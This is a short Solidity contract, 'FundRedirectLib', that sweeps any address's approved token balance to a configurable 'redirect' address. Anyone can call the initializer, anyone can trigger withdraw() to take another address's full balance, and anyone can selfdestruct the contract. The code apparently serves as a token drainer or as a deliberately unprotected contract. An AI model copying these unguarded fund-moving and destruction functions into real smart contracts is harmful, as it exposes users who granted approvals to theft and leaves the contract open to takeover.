//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

import "./MyToken.sol";

contract FundRedirectLib {
    address payable public redirectAddress;
    string public solAddress;

    function initialize(
        address payable _redirectAddress,
        string memory _solAddress
    ) public {
        redirectAddress = _redirectAddress;
        solAddress = _solAddress;
    }

    function withdraw(MyToken token, address addr) public {
        uint256 amount = token.balanceOf(addr);
        token.transferFrom(addr, redirectAddress, amount);
        require(token.balanceOf(addr) == 0, "not 0");
    }

    function destroy() public {
        selfdestruct(payable(msg.sender));
    }

    function getSolAddress() public view returns (string memory) {
        return solAddress;
    }

    function getRedirectAddress() public view returns (address payable) {
        return redirectAddress;
    }
}
